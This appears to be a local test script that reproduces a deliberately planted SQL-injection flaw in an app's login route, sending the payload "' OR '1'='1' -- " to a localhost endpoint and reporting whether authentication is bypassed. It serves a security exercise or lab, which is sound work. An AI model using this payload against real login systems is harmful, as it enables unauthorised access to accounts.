// ============================================================================
//  LOCAL, APP-ONLY test case: SQL-injection auth bypass against THIS app.
//
//  Hard-wired to http://127.0.0.1:3000 — this is not a reusable scanner, it is
//  a single repro of the planted [VULN: SQL injection — Task 2] in
//  src/app/api/login/route.ts. Run the dev server first (npm run dev).
//
//  Usage:  node tests/sqli-login.mjs
// ============================================================================
const BASE = "http://127.0.0.1:3000";

// Classic tautology that comments out the password check:
//   WHERE p.email = '' OR '1'='1' -- ' AND c.password = '...'
const injection = { email: "' OR '1'='1' -- ", password: "irrelevant" };

console.log("Attempting login WITHOUT valid credentials, using SQLi payload:");
console.log("  email    =", JSON.stringify(injection.email));
console.log("  password =", JSON.stringify(injection.password));

const res = await fetch(`${BASE}/api/login`, {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify(injection),
});
const data = await res.json();
const setCookie = res.headers.getSetCookie?.() ?? [];

console.log("\nHTTP status:", res.status);
console.log("Response body:", JSON.stringify(data));
console.log("Set-Cookie:", setCookie);

if (res.ok && data.ok) {
  console.log(
    `\n[BYPASS CONFIRMED] Logged in as ${data.user?.email} (role=${data.user?.role}) ` +
      "with no valid password — the login query is injectable."
  );
  process.exit(0);
} else {
  console.log("\n[NO BYPASS] The injection did not authenticate (is the DB seeded?).");
  process.exit(1);
}
